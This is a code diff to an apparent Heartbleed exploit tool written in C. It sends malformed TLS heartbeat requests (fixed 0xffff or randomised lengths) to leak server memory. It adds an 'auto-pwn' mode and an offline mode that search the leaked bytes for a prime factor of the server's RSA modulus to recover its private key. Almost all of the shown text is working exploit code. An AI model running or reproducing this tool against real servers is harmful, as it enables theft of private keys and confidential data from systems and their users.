@@ -74,17 +74,25 @@ int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
 #include <string.h>
 #include <stdarg.h>
 
+/*
+ * Use '-d' option to get more verbose debug logging while running
+ * the scan
+ */
 int is_debug = 0;
 
 /**
- * Arguments for the heartbleed callback function
+ * Arguments for the heartbleed callback function. We read these from the
+ * command line and pass them to the threads
  */
 struct DumpArgs {
     unsigned is_alert;
     FILE *fp;
     const char *filename;
     const char *hostname;
+    const char *cert_filename;
     unsigned is_error;
+    unsigned is_auto_pwn;
+    unsigned is_rand_size;
     unsigned loop_count;
     unsigned ip_ver;
     unsigned port;
@@ -113,6 +121,34 @@ int DEBUG_MSG(const char *fmt, ...)
     vfprintf(stderr, fmt, marker);
     va_end(marker);
     return -1;
+}
+
+
+/****************************************************************************
+ ****************************************************************************/
+void
+hexdump(const unsigned char *buf, size_t len)
+{
+    size_t i;
+    
+    for (i=0; i<len; i += 16) {
+        size_t j;
+
+        printf("%04x ", i);
+        for (j=i; j<len && j<i+16; j++) {
+            printf("%02x ", buf[j]);
+        }
+        for ( ; j<i+16; j++)
+            printf("   ");
+
+        for (j=i; j<len && j<i+16; j++) {
+            if (isprint(buf[j]) && !isspace(buf[j]))
+                printf("%c", buf[j]);
+            else
+                printf(".");
+        }
+        printf("\n");
+    }
 }
 
 /****************************************************************************
@@ -167,28 +203,8 @@ dump_bytes(int write_p, int version, int content_type,
     /*
      * Display bytes if not dumping to file
      */
-    if (!args->fp) {
-        size_t i;
-    
-        /* no file, so print hex dump instead */
-        for (i=0; i<len; i += 16) {
-            size_t j;
-
-            printf("%04x ", i);
-            for (j=i; j<len && j<i+16; j++) {
-                printf("%02x ", buf[j]);
-            }
-            for ( ; j<i+16; j++)
-                printf("   ");
-
-            for (j=i; j<len && j<i+16; j++) {
-                if (isprint(buf[j]) && !isspace(buf[j]))
-                    printf("%c", buf[j]);
-                else
-                    printf(".");
-            }
-            printf("\n");
-        }
+    if (!args->fp && is_debug) {
+        hexdump(buf, len);
     }
 }
 
@@ -217,6 +233,61 @@ my_inet_ntop(int family, struct sockaddr *sa, char *dst, size_t sizeof_dst)
 }
 
 /****************************************************************************
+ * This function searches a buffer looking for a prime that is a factor
+ * of the public key
+ ****************************************************************************/
+int
+find_private_key(const BIGNUM *n, const unsigned char *buf, size_t buf_length)
+{
+    size_t i;
+    int prime_length = 128;
+    BN_CTX *ctx;
+    BIGNUM p;
+    BIGNUM dv;
+    BIGNUM rem;
+
+    BN_init(&dv);
+    BN_init(&rem);
+    BN_init(&p);
+
+    if (buf_length < (size_t)prime_length)
+        return 0;
+
+    ctx = BN_CTX_new();
+
+    /* Go foward one byte at a time through the buffer */
+    for (i=0; i<buf_length-prime_length; i++) {
+        if (!(buf[i+prime_length-1] & 1))
+            continue;
+        BN_bin2bn(buf + i, prime_length, &p);
+
+        /*if (!BN_is_prime_fasttest(&p, BN_prime_checks, 0, ctx, 0, 1))
+            continue;*/
+        if (p.top > 30) {
+            BN_div(&dv, &rem, n, &p, ctx);
+            if (BN_is_zero(&rem)) {
+                BIGNUM nn;
+                BN_init(&nn);
+                BN_mul(&nn, &p, &dv, ctx);
+                printf("****\n");
+                if (BN_cmp(&nn, n) == 0) {
+                    return 1;
+                }
+                BN_free(&nn);
+            }
+        }
+        //printf("rem = %u\n", rem.top*8*4);
+    }
+
+    BN_free(&p);
+    BN_free(&dv);
+    BN_free(&rem);
+    BN_CTX_free(ctx);
+
+    return 0;
+}
+
+/****************************************************************************
  ****************************************************************************/
 void
 process_bleed(struct DumpArgs *args)
@@ -230,8 +301,48 @@ process_bleed(struct DumpArgs *args)
     if (x != args->byte_count) {
         ERROR_MSG("[-] %s: %s\n", args->filename, strerror(errno));
     }
+
+    if (args->is_auto_pwn) {
+        if (find_private_key(&args->n, args->buf, args->byte_count)) {
+            printf("key found!\n");
+            exit(1);
+        }
+
+    }
+
     fflush(args->fp);
     args->byte_count = 0;
+}
+
+/****************************************************************************
+ * Parse details from a certificate. We use this in order to grab
+ * the 'modulus' from the certificate in order to crack it with
+ * patterns found in memory. This is called in two places. One is when
+ * we get the certificate from the server when conneting to it.
+ * The other is offline cracking from files.
+ ****************************************************************************/
+void
+parse_cert(X509 *cert, char name[512], BIGNUM *modulus)
+{
+    X509_NAME *subj;
+    EVP_PKEY *rsakey;
+
+    subj = X509_get_subject_name(cert);
+    if (subj) {
+        int len;
+        len = X509_NAME_get_text_by_NID(subj, NID_commonName, name, sizeof(name));
+        if (len > 0) {
+            name[255] = '\0';
+            DEBUG_MSG("[+] servername = %s\n", name);
+        }
+    }
+
+    rsakey = X509_get_pubkey(cert);
+    if (rsakey && rsakey->type == 6) {
+        BIGNUM *n = rsakey->pkey.rsa->n;
+        memcpy(modulus, n, sizeof(*modulus));
+        DEBUG_MSG("[+] RSA public-key length = %u-bits\n", n->top*4*8);
+    }
 }
 
 /****************************************************************************
@@ -419,32 +530,13 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      */
     {
         X509 *cert;
+        char name[512];
 
         cert = SSL_get_peer_certificate(ssl);
         if (cert) {
-            X509_NAME *subj;
-            EVP_PKEY *rsakey;
-
-            subj = X509_get_subject_name(cert);
-            if (subj) {
-                char name[512];
-                int len;
-                len = X509_NAME_get_text_by_NID(subj, NID_commonName, name, sizeof(name));
-                if (len > 0) {
-                    name[255] = '\0';
-                    DEBUG_MSG("[+] servername = %s\n", name);
-                }
-            }
-
-            rsakey = X509_get_pubkey(cert);
-            if (rsakey && rsakey->type == 6) {
-                BIGNUM *n = rsakey->pkey.rsa->n;
-                memcpy(&args->n, n, sizeof(args->n));
-                DEBUG_MSG("[+] RSA public-key length = %u-bits\n", n->dmax*4*8);
-            }
+            parse_cert(cert, name, &args->n);
+            X509_free(cert);
         }
-
-        X509_free(cert);
     }
 
     
@@ -471,7 +563,17 @@ again:
      */
     ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
                             http_request, strlen(http_request));
-    ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);
+    if (args->is_rand_size) {
+        unsigned size = rand();
+        char rbuf[3];
+        if (size <= 128)
+            size = 128;
+        rbuf[0] = 1;
+        rbuf[1] = (char)(size>>8);
+        rbuf[2] = (char)(size>>0);
+        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 3);
+    } else
+        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);
 
 
 
@@ -567,16 +669,9 @@ again:
     DEBUG_MSG("[+] connection terminated\n");
 end:
     process_bleed(args);
-    /*if (rbio)
-        BIO_free(rbio);
-    if (wbio)
-        BIO_free_all(wbio);*/
-    if (ssl)
-        SSL_free(ssl);
-    if (ctx)
-        SSL_CTX_free(ctx);
-    if (fd != -1)
-        closesocket(fd);
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    closesocket(fd);
     if (args->fp) {
         fclose(args->fp);
         args->fp = NULL;
@@ -585,6 +680,72 @@ end:
 }
 
 
+/****************************************************************************
+ * Process the files produced by this tool, or other tools, looking for
+ * the private key in the given certificate.
+ ****************************************************************************/
+void
+process_offline_file(const char *filename_cert, const char *filename_bin)
+{
+    FILE *fp;
+    X509 *cert;
+    char name[512];
+    BIGNUM modulus;
+    unsigned long long offset = 0;
+    unsigned long long last_offset = 0;
+
+    /*
+     * Read in certificate
+     */
+    fp = fopen(filename_cert, "rb");
+    if (fp == NULL) {
+        perror(filename_cert);
+        return;
+    }
+    cert = PEM_read_X509(fp, NULL, NULL, NULL);
+	if (cert == NULL) {
+		fprintf(stderr, "%s: error parsing certifiate\n", filename_cert);
+		fclose(fp);
+		return;
+	}
+    fclose(fp);
+    parse_cert(cert, name, &modulus);
+
+    /*
+     * Read in the file to process
+     */
+    fp = fopen(filename_bin, "rb");
+    if (fp == NULL) {
+        perror(filename_bin);
+        goto end;
+    }
+    while (!feof(fp)) {
+        unsigned char buf[65536 + 18];
+        size_t bytes_read;
+
+        bytes_read = fread(buf, 1, sizeof(buf), fp);
+        if (bytes_read == 0)
+            break;
+
+        if (find_private_key(&modulus, buf, bytes_read)) {
+            fprintf(stderr, "found: offset=%llu\n", offset);
+            exit(1);
+        }
+
+        offset += bytes_read;
+
+        if (offset > last_offset + 1024*1024) {
+            printf("%llu bytes read\n", offset);
+            last_offset = offset;
+        }
+    }
+    fclose(fp);
+
+
+	
+	end:
+	X509_free(cert);
+}
 
 
 /****************************************************************************
@@ -641,7 +802,6 @@ usage:
         if (argv[i][0] != '-') {
             fprintf(stderr, "%s: unknown option\n", argv[i]);
             goto usage;
-        
         }
 
         /* 
@@ -650,7 +810,7 @@ usage:
          * -t www.google.com
          */
         c = argv[i][1];
-        if (c == 'd')
+        if (c == 'd' || c == 'a')
             ;
         else if (argv[i][2] == '\0') {
             arg = argv[++i];
@@ -665,6 +825,12 @@ usage:
          * Get the parameter
          */
         switch (c) {
+        case 'a':
+            args.is_auto_pwn = 1;
+            break;
+        case 'c':
+            args.cert_filename = arg;
+            break;
         case 'd':
             is_debug++;
             break;
@@ -673,6 +839,9 @@ usage:
             break;
         case 'f':
             args.filename = arg;
+            break;
+        case 'F':
+            process_offline_file(args.cert_filename, arg);
             break;
         case 'l':
             args.loop_count = strtoul(arg, 0, 0);
@@ -683,6 +852,9 @@ usage:
                 fprintf(stderr, "%u: bad port number\n", args.port);
                 goto usage;
             }
+            break;
+        case 'S':
+            args.is_rand_size = 1;
             break;
         case 'v':
             args.ip_ver = strtoul(arg, 0, 0);
